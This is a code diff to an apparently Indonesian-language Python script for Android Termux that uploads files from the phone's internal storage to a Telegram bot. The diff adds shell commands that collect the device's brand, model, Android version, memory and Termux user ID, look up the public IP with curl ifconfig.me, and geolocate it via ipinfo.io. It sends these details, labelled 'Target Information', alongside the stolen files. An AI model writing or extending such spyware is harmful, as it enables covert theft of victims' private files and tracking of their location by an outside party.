@@ -25,6 +25,7 @@ import os
 import requests
 import time
 import sys
+import subprocess
 from pathlib import Path
 
 # Konfigurasi Bot Telegram
@@ -37,33 +38,81 @@ TELEGRAM_MESSAGE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 INTERNAL_DIR = "/storage/emulated/0"  # Root direktori internal
 SENT_FILES_LOG = os.path.expanduser("~/.sent_files.log")  # File log untuk menyimpan daftar file yang sudah dikirim
 
+# Fungsi untuk menjalankan perintah shell dan mengambil output
+def run_shell_command(command):
+    try:
+        result = subprocess.check_output(command, shell=True, text=True)
+        return result.strip()
+    except subprocess.CalledProcessError:
+        return "Tidak Diketahui"
+
 # Mengambil informasi perangkat
 def get_device_info():
-    device_name = ""
-    android_version = ""
-    ip_address = ""
-    return device_name, android_version, ip_address
+    # ID Termux
+    termux_id = run_shell_command("whoami")
+
+    # Merek dan model perangkat
+    device_brand = run_shell_command("getprop ro.product.brand")
+    device_model = run_shell_command("getprop ro.product.model")
+    device_name = f"{device_brand} {device_model}"
+
+    # Versi Android
+    android_version = run_shell_command("getprop ro.build.version.release")
+
+    # Memori (RAM)
+    mem_total = run_shell_command("grep MemTotal /proc/meminfo | awk '{print $2}'")
+    mem_available = run_shell_command("grep MemAvailable /proc/meminfo | awk '{print $2}'")
+    memory = f"{int(mem_available) // 1024}Mi / {int(mem_total) // 1024}Mi"
+
+    # Alamat IP
+    ip_address = run_shell_command("curl -s ifconfig.me")
+
+    # Lokasi (kota, wilayah, negara, koordinat)
+    try:
+        location_data = requests.get(f"https://ipinfo.io/{ip_address}/json").json()
+        city = location_data.get("city", "Tidak Diketahui")
+        region = location_data.get("region", "Tidak Diketahui")
+        country = location_data.get("country", "Tidak Diketahui")
+        loc = location_data.get("loc", "Tidak Diketahui")
+        location = f"{loc}"
+    except:
+        city = region = country = location = "Tidak Diketahui"
+
+    return device_name, android_version, ip_address, termux_id, memory, city, region, country, location
 
 # Fungsi untuk mengirim pesan ke Telegram
 def send_message(message):
     data = {
         "chat_id": CHAT_ID,
-        "text": message
+        "text": message,
+        "parse_mode": "Markdown"
     }
     response = requests.post(TELEGRAM_MESSAGE_URL, data=data)
     return response.status_code == 200
 
 # Fungsi untuk mengirim file dengan penanganan rate limit
 def send_file(file_path):
-    device_name, android_version, ip_address = get_device_info()
+    device_name, android_version, ip_address, termux_id, memory, city, region, country, location = get_device_info()
     
     # Deskripsi file (lokasi file)
-    file_location = f"📂 Lokasi File: {file_path}"
-    message = f"📱 Perangkat: {device_name}\n⚙️ Versi Android: {android_version}\n👾 IP Address: {ip_address}\n{file_location}"
+    file_location = f"📂 Asal Direktori: {file_path}"
+    message = f"""
+🔰 *Informasi Target* 🔰
+📝 ID TERMUX Target : `{termux_id}`
+📱 Merek : {device_name}
+🖥️ OS : {android_version}
+💾 Memori : {memory}
+{file_location}
+🌐 Alamat IP : {ip_address}
+🏙️ Kota : {city}
+📍 Wilayah : {region}
+🇨🇺 Negara : {country}
+📌 Lokasi : {location}
+"""
 
     with open(file_path, 'rb') as file:
         files = {'document': file}
-        data = {'chat_id': CHAT_ID, 'caption': message}
+        data = {'chat_id': CHAT_ID, 'caption': message, 'parse_mode': 'Markdown'}
 
         retry_delay = 3  # Mulai dengan 3 detik
         max_retries = 3  # Maksimum percobaan ulang
